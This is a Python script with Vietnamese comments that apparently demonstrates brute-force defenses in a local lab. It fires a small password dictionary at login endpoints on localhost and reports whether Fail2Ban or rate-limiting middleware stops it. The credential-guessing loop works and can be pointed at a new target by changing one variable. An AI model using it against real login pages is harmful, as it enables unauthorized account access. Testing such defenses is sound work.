import requests
import time
import sys
import random

# --- CẤU HÌNH MÀU SẮC CHO NGẦU ---
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# --- CẤU HÌNH TẤN CÔNG ---
# Vì chạy trên chính máy ảo nên dùng localhost cho tiện
TARGET_IP = "127.0.0.1" 
PORT = 3000
URL_VULN = f"http://{TARGET_IP}:{PORT}/login-vulnerable"
URL_SECURE = f"http://{TARGET_IP}:{PORT}/login-secure"

# Danh sách mật khẩu giả lập (Dictionary)
PASSWORDS = [
    "123456", "password", "admin", "root", "qwerty", 
    "111111", "admin123", "secret", "iloveyou", "hackme",
    "superman", "master", "dragon", "baseball", "football"
]

def print_banner():
    print(Colors.CYAN + Colors.BOLD + """
    =============================================
       💀 BRUTE-FORCE ATTACK SIMULATOR V2.0 💀
    =============================================
    """ + Colors.ENDC)

def attack(url, mode_name):
    print(Colors.HEADER + f"[*] Đang khởi tạo tấn công vào mục tiêu: {mode_name}" + Colors.ENDC)
    print(Colors.BLUE + f"[*] Target URL: {url}" + Colors.ENDC)
    print(f"[*] Loaded {len(PASSWORDS)} passwords payload...")
    print("-" * 50)
    time.sleep(1)

    blocked = False
    
    for i, pwd in enumerate(PASSWORDS):
        try:
            # Giả lập độ trễ ngẫu nhiên cho giống người thật (0.1 - 0.3s)
            # Nếu muốn nhanh như máy thì bỏ dòng sleep này đi
            # time.sleep(random.uniform(0.1, 0.3)) 
            
            sys.stdout.write(f"\r[Attempt {i+1}/{len(PASSWORDS)}] Trying password: {Colors.BOLD}{pwd:<15}{Colors.ENDC}")
            sys.stdout.flush()
            
            # Gửi request
            response = requests.post(url, json={'username': 'admin', 'password': pwd}, timeout=2)

            if response.status_code == 200:
                print(f"\n{Colors.GREEN}[+] SUCCESS! Password found: {pwd}{Colors.ENDC}")
                return
            elif response.status_code == 429:
                print(f"\n{Colors.WARNING}[!] RATE LIMIT DETECTED! (HTTP 429){Colors.ENDC}")
                print(f"{Colors.WARNING}>>> MIDDLEWARE DEFENSE IS ACTIVE.{Colors.ENDC}")
                blocked = True
                break
            elif response.status_code == 401:
                # Đăng nhập sai bình thường
                pass
            else:
                print(f"\n{Colors.FAIL}[!] Unknown status: {response.status_code}{Colors.ENDC}")

        except requests.exceptions.ConnectionError:
            print(f"\n\n{Colors.FAIL}{Colors.BOLD}>>> [CRITICAL] CONNECTION REFUSED!{Colors.ENDC}")
            print(f"{Colors.FAIL}>>> FIREWALL (Fail2Ban) HAS BANNED YOUR IP.{Colors.ENDC}")
            print(f"{Colors.FAIL}>>> ATTACK STOPPED.{Colors.ENDC}")
            blocked = True
            break
        except Exception as e:
            print(f"\n{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
            break
    
    print("-" * 50)
    if not blocked:
        print(Colors.BLUE + "[*] Attack finished without being blocked." + Colors.ENDC)
    else:
        print(Colors.FAIL + Colors.BOLD + "[*] SYSTEM DEFENSE SUCCESSFULLY TRIGGERED." + Colors.ENDC)

# --- CHƯƠNG TRÌNH CHÍNH ---
if __name__ == "__main__":
    print_banner()
    print("Chọn chế độ tấn công:")
    print("1. Tấn công 'Ngây thơ' (Vulnerable Endpoint -> Test Fail2Ban)")
    print("2. Tấn công 'Thông minh' (Secure Endpoint -> Test Middleware)")
    
    choice = input(f"\n{Colors.BOLD}root@hacker:~$ {Colors.ENDC}")

    if choice == '1':
        attack(URL_VULN, "Fail2Ban Trigger")
    elif choice == '2':
        attack(URL_SECURE, "Middleware Stress Test")
    else:
        print("Lựa chọn sai. Thoát.")
